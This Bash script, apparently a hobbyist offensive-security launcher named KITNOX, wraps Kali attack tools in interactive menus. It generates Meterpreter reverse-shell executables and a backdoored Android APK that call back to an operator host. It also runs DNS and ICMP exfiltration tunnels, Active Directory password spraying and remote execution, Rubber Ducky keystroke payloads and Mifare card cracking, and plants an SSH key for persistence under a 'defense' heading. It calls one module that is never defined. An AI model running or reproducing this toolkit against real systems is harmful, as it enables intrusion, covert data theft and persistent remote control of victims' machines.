#!/bin/bash

# ==============================================================================
#  KITNOX OMNISCIENCE EDITION - v10.0
#  The Limitless Cybersecurity Framework
#  Network | Cloud | Red | Blue | Physical | Vehicle | Dark Web
#  Target System: Kali Linux / Parrot OS
#  Author: Nox
#  WARNING: Authorized Use Only.
# ==============================================================================

# ============================
#  CORE CONFIGURATION
# ============================
export LANG=C.UTF-8
WORK_DIR="$(pwd)/projects"
TOOLS_DIR="$HOME/tools"
WORDLISTS_DIR="/usr/share/wordlists"
LOG_FILE="$(pwd)/kitnox.log"

# Colors & Formatting
R="\e[31m"; G="\e[32m"; B="\e[34m"; Y="\e[33m"; C="\e[36m"; M="\e[35m"; W="\e[97m"; GR="\e[90m"; END="\e[0m"; BOLD="\e[1m"; BG_R="\e[41m"; BG_B="\e[44m"

# Root Check
if [ "$EUID" -ne 0 ]; then echo -e "${R}[!] EJECUTA COMO ROOT (sudo ./kitnox.sh)${END}"; exit 1; fi

# Trap
trap ctrl_c SIGINT
ctrl_c() { echo -e "\n${BG_R}${W} [!] OMNISCIENCE HALTED... Stopping Services... ${END}"; service tor stop 2>/dev/null; service postgresql stop 2>/dev/null; tput cnorm; exit 1; }

# Logging
log() { echo "[$(date +'%T')] $1" >> "$LOG_FILE"; }
pause() { echo ""; read -p " [ENTER] Continuar..."; }

# Banner
banner() {
    clear
    echo -e "${M}"
    echo "██╗  ██╗██╗████████╗███╗   ██╗ ██████╗ ██╗  ██╗"
    echo "██║ ██╔╝██║╚══██╔══╝████╗  ██║██╔═══██╗╚██╗██╔╝"
    echo "█████╔╝ ██║   ██║   ██╔██╗ ██║██║   ██║ ╚███╔╝ "
    echo "██╔═██╗ ██║   ██║   ██║╚██╗██║██║   ██║ ██╔██╗ "
    echo "██║  ██╗██║   ██║   ██║ ╚████║╚██████╔╝██╔╝ ██╗"
    echo "╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝"
    echo -e "${END}"
    echo -e "${C}   OMNISCIENCE EDITION v10.0 - BEYOND LIMITS${END}"
    echo -e "${B}================================================${END}"
    [ ! -z "$TARGET" ] && echo -ne "TARGET: ${G}$TARGET${END} | "
    [ ! -z "$PROJECT" ] && echo -ne "PROJ: ${Y}$PROJECT${END}"
    echo ""
    echo -e "${B}================================================${END}"
}

# ============================
#  INSTALLER (MASSIVE)
# ============================
install_omniscience() {
    echo -e "${Y}[*] Installing Omniscience Arsenal... (Prepare internet)${END}"
    
    # Base
    apt-get update -qq
    apt-get install -y kali-tools-top10 kali-tools-web kali-tools-wireless kali-tools-passwords kali-tools-forensics kali-tools-social-engineering kali-tools-reverse-engineering kali-tools-rfid >/dev/null 2>&1
    
    # Recon / Web / Cloud
    apt-get install -y masscan subfinder httpx nuclei wpscan sqlmap commix ffuf gobuster feroxbuster whatweb wafw00f cloud-enum >/dev/null 2>&1
    pip3 install pacu scoutsuite sherlock-project spiderfoot phoneinfoga onionsearch --break-system-packages >/dev/null 2>&1
    
    # AD / Internal
    apt-get install -y bloodhound bloodhound.py evil-winrm netexec impacket-scripts >/dev/null 2>&1
    go install -v github.com/ropnop/kerbrute@latest >/dev/null 2>&1
    
    # Exfiltration
    apt-get install -y dnscat2 iodine ptunnel >/dev/null 2>&1
    
    # Vehicle / Physical / Radio
    apt-get install -y can-utils mfoc mfcuk hackrf gnuradio >/dev/null 2>&1
    
    # Payload / Evasion / C2
    apt-get install -y shellter veil metasploit-framework sliver >/dev/null 2>&1
    
    # Mobile / IoT
    apt-get install -y adb scrcpy jadx apktool routersploit mosquitto-clients >/dev/null 2>&1
    
    # Crypto / Binary
    pip3 install ciphey ropper --break-system-packages >/dev/null 2>&1
    apt-get install -y gdb checksec radare2 >/dev/null 2>&1
    
    # Blue / Purple
    apt-get install -y rkhunter lynis chkrootkit clamav >/dev/null 2>&1
    
    # Utils
    apt-get install -y macchanger tor proxychains4 >/dev/null 2>&1
    
    echo -e "${G}[+] Omniscience Installed.${END}"
    pause
}

# ============================
#  MODULES
# ============================

# --- 1. RECON & CLOUD (RED) ---
recon_module() {
    while true; do
        clear; banner
        echo -e "${B}>>> RED TEAM: RECON & CLOUD${END}"
        echo "1) ⚡ Auto-Recon (Subdomains -> Alive -> Nuclei)"
        echo "2) ☁️ Cloud Enum (S3/Azure/GCP)"
        echo "3) 🦅 AWS Exploitation (Pacu)"
        echo "4) 🌩️ Multi-Cloud Audit (ScoutSuite)"
        echo "5) 🕷️ Web Crawler & Tech Detect"
        echo "6) 🔙 Volver"
        read -p "Opción: " op
        case $op in
            1)
                subfinder -d $TARGET -o "$PROJECT_DIR/recon/subs.txt"
                httpx -l "$PROJECT_DIR/recon/subs.txt" -o "$PROJECT_DIR/recon/alive.txt"
                nmap -sC -sV -iL "$PROJECT_DIR/recon/alive.txt" -oN "$PROJECT_DIR/recon/nmap.txt"
                nuclei -l "$PROJECT_DIR/recon/alive.txt" -t cves/ -o "$PROJECT_DIR/vulns/nuclei.txt"
                ;;
            2) cloud_enum -k $TARGET -l "$PROJECT_DIR/recon/cloud_enum.txt" ;;
            3) pacu ;;
            4) scoutsuite aws ;; 
            5) feroxbuster -u "http://$TARGET" --output "$PROJECT_DIR/recon/ferox.txt"; whatweb $TARGET ;;
            6) return ;;
        esac
        pause
    done
}

# --- 2. EXFILTRATION & TUNNEL (RED) ---
exfil_module() {
    while true; do
        clear; banner
        echo -e "${R}>>> COVERT OPS: EXFILTRATION${END}"
        echo "1) 🚇 DNS Tunnel Server (Dnscat2)"
        echo "2) 🐆 DNS Tunnel Client (Iodine)"
        echo "3) 🐧 ICMP Tunnel (Ptunnel)"
        echo "4) 🔙 Volver"
        read -p "Opción: " op
        case $op in
            1) read -p "Domain: " d; dnscat2 "$d" ;;
            2) read -p "Domain: " d; iodined -f -c -P password 10.0.0.1 "$d" ;;
            3) read -p "Target IP: " t; ptunnel -p "$t" -lp 8000 -da 127.0.0.1 -dp 22 ;;
            4) return ;;
        esac
        pause
    done
}

# --- 3. DARK WEB OSINT (RED) ---
dark_module() {
    while true; do
        clear; banner
        echo -e "${GR}>>> DARK WEB OPERATIONS (ToR)${END}"
        echo "1) 🧅 OnionSearch (Keyword Hunt)"
        echo "2) 🕷️ TorBot (Onion Crawler)"
        echo "3) 🛡️ Start Tor Service"
        echo "4) 🔙 Volver"
        read -p "Opción: " op
        case $op in
            1) 
                service tor start
                read -p "Keyword: " k
                onionsearch "$k" --proxy 127.0.0.1:9050 --output "$PROJECT_DIR/osint/onion_results.txt" 
                ;;
            2) echo "TorBot (Verify install in tools dir)";;
            3) service tor start; echo "Tor Started." ;;
            4) return ;;
        esac
        pause
    done
}

# --- 4. VEHICLE & PHYSICAL (RED) ---
phys_module() {
    while true; do
        clear; banner
        echo -e "${Y}>>> PHYSICAL & VEHICLE HACKING${END}"
        echo "1) � CAN Bus Sniffer (Vehicle)"
        echo "2) ⚡ CAN Dump (Record Traffic)"
        echo "3) 🦆 Generate Ducky Script (Payload)"
        echo "4) 💳 NFC/RFID Cracking (Mifare)"
        echo "5) 🔙 Volver"
        read -p "Opción: " op
        case $op in
            1) read -p "Interface (can0): " i; cansniffer -c "$i" ;;
            2) read -p "Interface (can0): " i; candump "$i" -L > "$PROJECT_DIR/log.candump" ;;
            3) 
                read -p "Payload Cmd: " c
                echo "DELAY 1000" > payload.ducky
                echo "GUI r" >> payload.ducky
                echo "DELAY 200" >> payload.ducky
                echo "STRING $c" >> payload.ducky
                echo "ENTER" >> payload.ducky
                echo "Saved to payload.ducky"
                ;;
            4) mfoc -O "$PROJECT_DIR/card_dump.mfd" ;;
            5) return ;;
        esac
        pause
    done
}

# --- 5. AD & INTERNAL (RED) ---
ad_module() {
    while true; do
        clear; banner
        echo -e "${R}>>> ACTIVE DIRECTORY${END}"
        echo "1) 🩸 BloodHound Ingestor"
        echo "2) 🔨 Kerbrute Enum"
        echo "3) ☠️ Impacket (PsExec/WmiExec)"
        echo "4) 🔑 NetExec (SMB Spray)"
        echo "5) 🚪 Evil-WinRM"
        echo "6) 🔙 Volver"
        read -p "Opción: " op
        case $op in
            1) 
                read -p "Domain: " d; read -p "User: " u; read -p "Pass: " p; read -p "DC IP: " dc
                bloodhound-python -u "$u" -p "$p" -d "$d" -dc "$dc" -c All
                ;;
            2) 
                read -p "Domain: " d; read -p "Userlist: " ul; read -p "DC IP: " dc
                kerbrute userenum -d "$d" --dc "$dc" "$ul"
                ;;
            3)
                echo "1. PsExec 2. WmiExec"
                read -p "> " i
                if [ "$i" == "1" ]; then read -p "Host: " t; read -p "U: " u; read -p "P: " p; impacket-psexec "$u:$p@$t"; fi
                if [ "$i" == "2" ]; then read -p "Host: " t; read -p "U: " u; read -p "P: " p; impacket-wmiexec "$u:$p@$t"; fi
                ;;
            4) read -p "Target: " t; read -p "U: " u; read -p "P: " p; netexec smb $t -u $u -p $p --shares ;;
            5) read -p "Target: " t; read -p "U: " u; read -p "P: " p; evil-winrm -i $t -u $u -p $p ;;
            6) return ;;
        esac
        pause
    done
}

# --- 6. WEAPONIZATION (RED) ---
weapon_module() {
    while true; do
        clear; banner
        echo -e "${R}>>> WEAPONIZATION & C2${END}"
        echo "1) 🦠 MSFVenom Wizard"
        echo "2) 👻 Veil Evasion"
        echo "3) 💀 Sliver C2"
        echo "4) 📱 Malicious APK"
        echo "5) 🔙 Volver"
        read -p "Opción: " op
        case $op in
            1)
                read -p "LHOST: " lh; read -p "LPORT: " lp
                msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -f exe > "$PROJECT_DIR/payload.exe"
                ;;
            2) /usr/share/veil/Veil.py ;;
            3) sliver-server ;;
            4)  read -p "Original APK: " o; read -p "LHOST: " lh; read -p "LPORT: " lp
                msfvenom -x "$o" -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -o "$PROJECT_DIR/evil.apk" ;;
            5) return ;;
        esac
        pause
    done
}

# --- 7. BLUE & PURPLE ---
blue_module() {
    while true; do
        clear; banner
        echo -e "${G}>>> BLUE & PURPLE TEAM${END}"
        echo "1) 🛡️ RKHunter (Rootkit Check)"
        echo "2) 🔒 Lynis Audit"
        echo "3) 🔑 Inject Persistence (SSH Key)"
        echo "4) 🔙 Volver"
        read -p "Opción: " op
        case $op in
            1) rkhunter --check ;;
            2) lynis audit system ;;
            3) echo "ssh-rsa AAAA... user@host" >> ~/.ssh/authorized_keys ;;
            4) return ;;
        esac
        pause
    done
}

# ============================
#  MAIN MENU
# ============================
init_project() {
    if [ -z "$PROJECT" ]; then
        read -p "Nombre del Proyecto: " PROJECT
        if [ -z "$PROJECT" ]; then PROJECT="omniscience_session"; fi
        PROJECT_DIR="$WORK_DIR/$PROJECT"
        mkdir -p "$PROJECT_DIR"/{recon,web,vulns,mobile,iot,payloads,evidence,logs,reports,osint}
        read -p "Target (IP/Domain): " TARGET
        export TARGET
        export PROJECT_DIR
    fi
}

main_menu() {
    init_project
    while true; do
        banner
        echo -e "${R} [ RED TEAM & OPS ] ${END}"
        echo " 1. Recon, Web & Cloud (Pacu, ScoutSuite)"
        echo " 2. Active Directory & Internal (BloodHound)"
        echo " 3. Weaponization & C2 (Sliver, MSF)"
        echo " 4. Exfiltration & Tunnels (DNS, ICMP)"
        
        echo -e "${C} [ SPECIALIZED ] ${END}"
        echo " 5. Physical & Vehicle (CAN, Ducky)"
        echo " 6. IoT & Mobile (ADB, RouterSploit)"
        echo " 7. Dark Web OSINT (OnionSearch)"
        echo " 8. Crypto & Binary (Ciphey, GDB)"
        
        echo -e "${G} [ DEFENSE ] ${END}"
        echo " 9. Blue & Purple (Lynis, Persistence)"
        
        echo -e "${B} [ SYSTEM ] ${END}"
        echo "10. INSTALL OMNISCIENCE (Full Setup)"
        echo "11. Exit"
        
        echo -e "${B}------------------------------------------------${END}"
        read -p "Select Module: " m
        
        case $m in
            1) recon_module ;;
            2) ad_module ;;
            3) weapon_module ;;
            4) exfil_module ;;
            5) phys_module ;;
            6) iot_module ;;
            7) dark_module ;;
            8) echo "Run Ciphey/GDB manually."; pause ;;
            9) blue_module ;;
            10) install_omniscience ;;
            11) exit 0 ;;
            *) echo "Invalid" ;;
        esac
    done
}

# Start
main_menu
